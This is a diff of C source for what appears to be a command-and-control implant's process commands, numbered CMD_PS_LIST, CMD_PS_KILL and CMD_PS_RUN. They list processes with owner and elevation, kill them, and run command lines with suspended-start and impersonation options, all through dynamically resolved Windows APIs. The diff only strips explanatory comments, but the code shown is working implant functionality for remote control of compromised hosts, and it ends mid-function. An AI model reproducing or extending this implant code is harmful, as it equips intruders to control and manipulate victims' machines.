@@ -32,11 +32,6 @@ static BOOL NaxTokenToUser( PNAX_INSTANCE Nax, HANDLE hToken, PCHAR username, DW
 
 /* ========= [ CMD_PS_LIST (0x23) ] ========= */
 
-/* Wire format (success):
- *   result(1)=1 + count(4LE) + count × [pid(2LE) + ppid(2LE) + session(2LE) + arch64(1) + elevated(1) + domain_len(2LE)+domain + username_len(2LE)+username + procname_len(2LE)+procname]
- * Wire format (failure):
- *   result(1)=0 + error_code(4LE) */
-
 FUNC INT CmdPsList( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len ) {
     (void)args; (void)args_len;
     if ( *out_len < 5 ) return NAX_ERR_NOMEM;
@@ -108,17 +103,14 @@ FUNC INT CmdPsList( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE 
                 NaxTokenToUser( Nax, hToken, username, &usernameLen, domain, &domSize, &elevated );
         }
 
-        /* Convert process name from wide to narrow */
         UINT32 imgChars = spi->ImageName.Length / 2;
         if ( imgChars > 259 ) imgChars = 259;
         Nax->Kernel32.WideCharToMultiByte( CP_UTF8, 0, spi->ImageName.Buffer, (INT)imgChars, procName, 259, NULL, NULL );
 
-        /* Measure string lengths */
         UINT32 pnLen = 0; while ( procName[pnLen] ) pnLen++;
         UINT32 unLen = 0; while ( username[unLen] ) unLen++;
         UINT32 dmLen = 0; while ( domain[dmLen] ) dmLen++;
 
-        /* per-entry size: pid(2) + ppid(2) + session(2) + arch64(1) + elevated(1) + domain(2+n) + username(2+n) + procname(2+n) */
         UINT32 entrySize = 2 + 2 + 2 + 1 + 1 + 2 + dmLen + 2 + unLen + 2 + pnLen;
         if ( pos + entrySize > cap ) goto cleanup;
 
@@ -152,7 +144,6 @@ FUNC INT CmdPsList( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE 
         spi = (PSYSTEM_PROCESS_INFORMATION)( (PBYTE)spi + spi->NextEntryOffset );
     } while ( 1 );
 
-    /* Write count into the reserved slot */
     countPos[0] = (BYTE)( count & 0xFF );
     countPos[1] = (BYTE)( ( count >> 8 ) & 0xFF );
     countPos[2] = (BYTE)( ( count >> 16 ) & 0xFF );
@@ -164,10 +155,6 @@ FUNC INT CmdPsList( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE 
 }
 
 /* ========= [ CMD_PS_KILL (0x24) ] ========= */
-
-/* args: pid(4LE)
- * result (success): pid(4LE)
- * result (failure): Win32 error via NaxWriteWin32Err */
 
 FUNC INT CmdPsKill( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len ) {
     if ( args_len < 4 || *out_len < 4 ) return NAX_ERR_INVAL;
@@ -197,7 +184,6 @@ FUNC INT CmdPsKill( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE 
         return NAX_ERR_FAIL;
     }
 
-    /* Return the killed PID as confirmation */
     out[0] = (BYTE)( pid & 0xFF );
     out[1] = (BYTE)( ( pid >> 8 ) & 0xFF );
     out[2] = (BYTE)( ( pid >> 16 ) & 0xFF );
@@ -208,13 +194,6 @@ FUNC INT CmdPsKill( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE 
 
 /* ========= [ CMD_PS_RUN (0x25) ] ========= */
 
-/* args: flags(1) + cmdline_len(4LE) + cmdline
- *   flags bit 0 (0x01): capture stdout/stderr (-o)
- *   flags bit 1 (0x02): create suspended      (-s)
- *   flags bit 2 (0x04): use impersonation      (-i, reserved)
- * result (success): pid(4LE) + flags(1) + output_text (if -o)
- * result (failure): Win32 error via NaxWriteWin32Err */
-
 FUNC INT CmdPsRun( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len ) {
     if ( args_len < 5 || *out_len < 5 ) return NAX_ERR_INVAL;
 
@@ -224,7 +203,6 @@ FUNC INT CmdPsRun( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE o
     UINT32 cmdLen = (UINT32)args[1] | ( (UINT32)args[2] << 8 ) | ( (UINT32)args[3] << 16 ) | ( (UINT32)args[4] << 24 );
     if ( 5 + cmdLen > args_len || cmdLen == 0 ) return NAX_ERR_INVAL;
 
-    /* Build NUL-terminated command line on heap */
     PCHAR cmdline = (PCHAR)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, cmdLen + 1 );
     if ( !cmdline ) return NAX_ERR_NOMEM;
     MmCopy( cmdline, args + 5, cmdLen );
